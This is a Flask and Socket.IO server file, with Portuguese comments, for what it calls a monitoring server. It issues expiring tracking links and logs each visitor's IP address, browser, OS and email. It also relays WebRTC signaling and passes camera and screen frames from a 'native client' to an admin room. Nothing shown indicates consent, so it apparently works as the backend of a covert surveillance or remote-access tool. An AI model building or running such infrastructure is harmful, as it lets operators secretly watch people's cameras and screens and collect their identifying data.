from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_socketio import SocketIO, emit, join_room
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from models import db, Link, AccessLog
from config import Config
from datetime import datetime, timedelta
import logging
import os
import base64

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('app.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Inicializar Flask
app = Flask(__name__)
app.config.from_object(Config)

# Validar configurações
try:
    Config.validate()
    logger.info("✅ Configurações validadas com sucesso")
except Exception as e:
    logger.error(f"❌ Erro na validação de configurações: {e}")
    raise

# Inicializar extensões
db.init_app(app)
socketio = SocketIO(app, cors_allowed_origins=Config.CORS_ALLOWED_ORIGINS)

# Rate Limiter
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)
logger.info("✅ Rate limiter configurado")

# Registrar Blueprints
from routes import api, dashboard as dashboard_bp
app.register_blueprint(api)
logger.info("✅ Blueprint API registrado em /api/v1")

# Nota: dashboard_bp tem rotas que conflitam com as atuais
# Por enquanto mantemos as rotas antigas no app.py
# Na próxima iteração podemos migrar completamente

# Create database tables
with app.app_context():
    db.create_all()

@app.route('/')
def dashboard():
    links = Link.query.order_by(Link.created_at.desc()).all()
    logs = AccessLog.query.order_by(AccessLog.timestamp.desc()).all()
    return render_template('dashboard.html', links=links, logs=logs)

@app.route('/generate_link', methods=['POST'])
@limiter.limit(Config.RATE_LIMIT_LINKS)
def generate_link():
    try:
        # Validação de input
        expiry_input = request.form.get('expiry', '60')
        max_uses_input = request.form.get('max_uses', '0')
        notes = request.form.get('notes', '')
        
        # Validar se é número
        try:
            expiry_minutes = int(expiry_input)
            max_uses = int(max_uses_input)
        except ValueError:
            logger.warning(f"Input inválido - expiry: {expiry_input}, max_uses: {max_uses_input}")
            return jsonify({'error': 'Expiração e usos máximos devem ser números inteiros'}), 400
        
        # Validar limites de expiração
        if expiry_minutes < 1:
            return jsonify({'error': 'Expiração mínima é 1 minuto'}), 400
        
        if expiry_minutes > Config.MAX_LINK_EXPIRY_MINUTES:
            return jsonify({
                'error': f'Expiração máxima é {Config.MAX_LINK_EXPIRY_MINUTES} minutos'
            }), 400
        
        # Validar max_uses
        if max_uses < 0:
            return jsonify({'error': 'Usos máximos não pode ser negativo'}), 400
        
        # Criar link
        expires_at = datetime.utcnow() + timedelta(minutes=expiry_minutes)
        new_link = Link(
            expires_at=expires_at,
            max_uses=max_uses,
            notes=notes[:500] if notes else None  # Limitar tamanho
        )
        db.session.add(new_link)
        db.session.commit()
        
        full_url = request.host_url + 'v/' + new_link.code
        
        logger.info(
            f"✅ Link criado: {new_link.code} "
            f"(expira em {expiry_minutes}min, max_uses: {max_uses or 'ilimitado'})"
        )
        return jsonify({
            'code': new_link.code, 
            'url': full_url,
            'expires_at': new_link.expires_at.isoformat(),
            'max_uses': new_link.max_uses
        })
        
    except Exception as e:
        logger.error(f"❌ Erro ao gerar link: {str(e)}")
        db.session.rollback()
        return jsonify({'error': 'Erro interno ao gerar link'}), 500

@app.route('/v/<code>')
def view_link(code):
    try:
        link = Link.query.filter_by(code=code).first()
        
        if not link:
            logger.warning(f"⚠️  Link não encontrado: {code}")
            return "Link não encontrado.", 404
        
        # Usar o novo método can_be_used()
        if not link.can_be_used():
            if link.is_expired():
                logger.info(f"⏰ Link expirado acessado: {code}")
                return "Este link expirou.", 410
            elif link.is_usage_exceeded():
                logger.info(f"🚫 Link com usos excedidos: {code}")
                return "Este link atingiu o número máximo de usos.", 410
            elif not link.is_active:
                logger.info(f"🔒 Link desativado acessado: {code}")
                return "Este link foi desativado.", 403
        
        # Incrementar contador de usos
        link.increment_usage()
        db.session.commit()
        
        logger.info(f"✅ Link acessado: {code} (uso {link.current_uses}/{link.max_uses or '∞'})")
        return render_template('client.html', link_code=code)
        
    except Exception as e:
        logger.error(f"❌ Erro ao acessar link {code}: {str(e)}")
        db.session.rollback()
        return "Erro ao processar link.", 500

@app.route('/log_access', methods=['POST'])
@limiter.limit(Config.RATE_LIMIT_ACCESS)
def log_access():
    try:
        data = request.json
        
        # Validar dados recebidos
        if not data or 'code' not in data:
            logger.warning("⚠️  Tentativa de log sem código")
            return jsonify({'error': 'Código do link é obrigatório'}), 400
        
        link = Link.query.filter_by(code=data.get('code')).first()
        
        if not link:
            logger.warning(f"⚠️  Tentativa de log para link inexistente: {data.get('code')}")
            return jsonify({'error': 'Link não encontrado'}), 404
        
        # Criar log
        log = AccessLog(
            link_id=link.id,
            ip_address=request.remote_addr,
            browser=data.get('browser', 'Unknown')[:100],  # Limitar tamanho
            os=data.get('os', 'Unknown')[:100],
            email=data.get('email', None)
        )
        
        db.session.add(log)
        db.session.commit()
        
        logger.info(f"📝 Acesso registrado: {link.code} - IP: {request.remote_addr}")
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logger.error(f"❌ Erro ao registrar acesso: {str(e)}")
        db.session.rollback()
        return jsonify({'error': 'Erro ao registrar acesso'}), 500

# Socket.IO - Gerenciamento de conexões
active_rooms = {}  # Rastrear rooms ativas
client_heartbeats = {}  # Rastrear heartbeats dos clientes

@socketio.on('connect')
def on_connect():
    """Cliente conectado"""
    try:
        logger.info(f"🔌 Cliente conectado: {request.sid}")
        client_heartbeats[request.sid] = datetime.utcnow()
    except Exception as e:
        logger.error(f"❌ Erro no connect: {str(e)}")

@socketio.on('join')
def on_join(data):
    """Cliente entrando em uma room"""
    try:
        room = data.get('room')
        if not room:
            logger.warning(f"⚠️  Tentativa de join sem room: {request.sid}")
            emit('error', {'message': 'Room não especificada'})
            return
        
        # Validar se é uma room válida (admin ou um SID válido)
        if room not in ['admin'] and not isinstance(room, str):
            logger.warning(f"⚠️  Room inválida: {room}")
            emit('error', {'message': 'Room inválida'})
            return
        
        join_room(room)
        
        # Registrar room ativa
        if room not in active_rooms:
            active_rooms[room] = []
        if request.sid not in active_rooms[room]:
            active_rooms[room].append(request.sid)
        
        logger.info(f"🔌 Cliente {request.sid} entrou na room: {room}")
        emit('joined', {'room': room, 'sid': request.sid})
        
    except Exception as e:
        logger.error(f"❌ Erro no join: {str(e)}")
        emit('error', {'message': 'Erro ao entrar na room'})

@socketio.on('heartbeat')
def on_heartbeat():
    """Heartbeat para manter conexão viva"""
    try:
        client_heartbeats[request.sid] = datetime.utcnow()
        emit('heartbeat_ack', {'timestamp': datetime.utcnow().isoformat()})
    except Exception as e:
        logger.error(f"❌ Erro no heartbeat: {str(e)}")

@socketio.on('signal')
def on_signal(data):
    """Sinalização WebRTC"""
    try:
        room = data.get('room')
        if not room:
            logger.warning(f"⚠️  Signal sem room: {request.sid}")
            return
        
        # Validar se a room existe
        if room not in active_rooms and room != 'admin':
            logger.warning(f"⚠️  Signal para room inexistente: {room}")
            return
        
        emit('signal', data, room=room, include_self=False)
        
    except Exception as e:
        logger.error(f"❌ Erro no signal: {str(e)}")

@socketio.on('native_frame')
def handle_native_frame(data):
    """Frame de câmera do cliente nativo"""
    try:
        if 'id' not in data or 'frame' not in data:
            logger.warning("⚠️  Frame nativo sem id ou frame")
            return
        
        # Atualizar heartbeat
        client_id = data.get('id')
        client_heartbeats[client_id] = datetime.utcnow()
        
        # Broadcast para admins
        emit('native_stream', data, broadcast=True, room='admin')
        
    except Exception as e:
        logger.error(f"❌ Erro ao processar frame nativo: {str(e)}")

@socketio.on('native_screen')
def handle_native_screen(data):
    """Frame de tela do cliente nativo"""
    try:
        if 'id' not in data or 'frame' not in data:
            logger.warning("⚠️  Screen nativo sem id ou frame")
            return
        
        # Atualizar heartbeat
        client_id = data.get('id')
        client_heartbeats[client_id] = datetime.utcnow()
        
        # Broadcast para admins
        emit('native_screen_stream', data, broadcast=True, room='admin')
        
    except Exception as e:
        logger.error(f"❌ Erro ao processar tela nativa: {str(e)}")

@socketio.on('disconnect')
def on_disconnect():
    """Cliente desconectado"""
    try:
        # Notificar admins
        emit('client_disconnected', {'id': request.sid}, room='admin')
        
        # Limpar rooms
        for room, clients in list(active_rooms.items()):
            if request.sid in clients:
                clients.remove(request.sid)
                logger.info(f"🔌 Cliente {request.sid} removido da room {room}")
            
            # Remover room se estiver vazia
            if len(clients) == 0 and room != 'admin':
                del active_rooms[room]
                logger.info(f"🧹 Room vazia removida: {room}")
        
        # Limpar heartbeat
        if request.sid in client_heartbeats:
            del client_heartbeats[request.sid]
        
        logger.info(f"🔌 Cliente desconectado: {request.sid}")
        
    except Exception as e:
        logger.error(f"❌ Erro no disconnect: {str(e)}")

# Limpeza periódica de clientes inativos
def cleanup_inactive_clients():
    """Remove clientes que não enviaram heartbeat há mais de 30 segundos"""
    try:
        timeout = timedelta(seconds=30)
        now = datetime.utcnow()
        
        inactive_clients = []
        for client_id, last_heartbeat in client_heartbeats.items():
            if now - last_heartbeat > timeout:
                inactive_clients.append(client_id)
        
        for client_id in inactive_clients:
            logger.warning(f"⏰ Cliente inativo removido: {client_id}")
            del client_heartbeats[client_id]
            
            # Limpar das rooms
            for room, clients in list(active_rooms.items()):
                if client_id in clients:
                    clients.remove(client_id)
                if len(clients) == 0 and room != 'admin':
                    del active_rooms[room]
        
    except Exception as e:
        logger.error(f"❌ Erro na limpeza de clientes: {str(e)}")

# Agendar limpeza periódica (a cada 60 segundos)
import threading
def schedule_cleanup():
    cleanup_inactive_clients()
    threading.Timer(60.0, schedule_cleanup).start()

# Iniciar limpeza ao startar
schedule_cleanup()

if __name__ == '__main__':
    try:
        logger.info("=" * 50)
        logger.info("🚀 Iniciando servidor de monitoramento...")
        logger.info(f"📍 URL: {Config.SERVER_URL}")
        logger.info(f"🔌 Porta: {Config.PORT}")
        logger.info(f"🌍 Ambiente: {Config.FLASK_ENV}")
        logger.info("=" * 50)
        
        socketio.run(
            app, 
            debug=(Config.FLASK_ENV == 'development'), 
            port=Config.PORT, 
            host='0.0.0.0'
        )
    except Exception as e:
        logger.critical(f"💥 Falha crítica ao iniciar servidor: {str(e)}")
        raise
